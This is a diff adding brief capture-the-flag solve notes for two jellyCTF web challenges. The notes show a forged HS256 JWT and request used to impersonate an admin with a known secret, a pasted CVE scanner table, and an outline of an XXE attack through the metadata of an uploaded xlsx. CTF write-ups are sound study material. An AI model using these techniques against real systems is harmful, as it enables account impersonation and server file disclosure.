@@ -1,0 +1,38 @@
+for 1: we're given secret, and want to impersonate jelly on the /admin panel
+
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+{
+  "user": "jelly"
+}
+secret singaQu5aeWoh1vuoJuD]ooJ9aeh2soh
+
+new token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiamVsbHkifQ.7wQ41K0c7OZqWaePlf3v0QKuX-jOc4kFqks_eWrfQhE
+
+GET /admin HTTP/2
+Host: vlookup-hot-singles.jellyc.tf
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiamVsbHkifQ.7wQ41K0c7OZqWaePlf3v0QKuX-jOc4kFqks_eWrfQhE
+
+jellyCTF{i_am_b3c0m3_awawa_d3str0y3r_0f_f3m4135}
+
+
+for 2:
+admin page has xlsx input
+
+used hint 1, 
+                                                                                                                                                                                            ┌──────────┬────────────────┬──────────┬────────┬───────────────────┬───────────────┬─────────────────────────────────────────────────────────────┐                                         │ Library  │ Vulnerability  │ Severity │ Status │ Installed Version │ Fixed Version │                            Title                            │                                         ├──────────┼────────────────┼──────────┼────────┼───────────────────┼───────────────┼─────────────────────────────────────────────────────────────┤                                         │ jinja2   │ CVE-2024-34064 │ MEDIUM   │ fixed  │ 3.1.3             │ 3.1.4         │ jinja2: accepts keys containing non-attribute characters    │                                         │          │                │          │        │                   │               │ https://avd.aquasec.com/nvd/cve-2024-34064                  │                                         ├──────────┼────────────────┼──────────┤        ├───────────────────┼───────────────┼─────────────────────────────────────────────────────────────┤                                         │ openpyxl │ CVE-2017-5992  │ HIGH     │        │ 2.4.1             │ 2.4.2         │ Openpyxl 2.4.1 resolves external entities by default, which │                                         │          │                │          │        │                   │               │ allows rem ...                                              │                                         │          │                │          │        │                   │               │ https://avd.aquasec.com/nvd/cve-2017-5992                   │                                         ├──────────┼────────────────┤          │        ├───────────────────┼───────────────┼─────────────────────────────────────────────────────────────┤                                         │ werkzeug │ CVE-2024-34069 │          │        │ 3.0.2             │ 3.0.3         │ python-werkzeug: user may execute code on a developer's     │                                         │          │                │          │        │                   │               │ machine                                                     │                                         │          │                │          │        │                   │               │ https://avd.aquasec.com/nvd/cve-2024-34069                  │                                         └──────────┴────────────────┴──────────┴────────┴───────────────────┴───────────────┴─────────────────────────────────────────────────────────────┘     
+got table
+
+
+https://avd.aquasec.com/nvd/2017/cve-2017-5992/ openpyxl seems most relevant
+
+create a blank xlsx and unzip it, edit xml and then zip back up
+
+for some reason xxe doesnt work in sharedstrings.xml
+also putting it in creator or lastmodifiedby doesn't work, only putting it in dc:subjects works
+
+jellyCTF{th1s_1snt_a_r3d_0n3_r1gh7?}
+
